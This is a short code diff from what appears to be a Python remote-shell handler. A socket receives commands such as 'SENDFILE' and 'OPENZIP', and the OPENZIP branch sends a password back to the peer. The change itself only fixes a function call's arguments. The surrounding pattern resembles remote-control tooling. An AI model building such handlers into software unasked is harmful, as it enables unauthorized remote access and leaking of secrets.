@@ -16,7 +16,7 @@ def runShell(socketHolder):
 	data = socketHolder.recv(1024)
 	if data:
 		if data == "SENDFILE":
-			incomingFile(data, socketHolder)
+			incomingFile(socketHolder)
 		elif data == "OPENZIP":
 			password = openZip()
 			socketHolder.send(password)
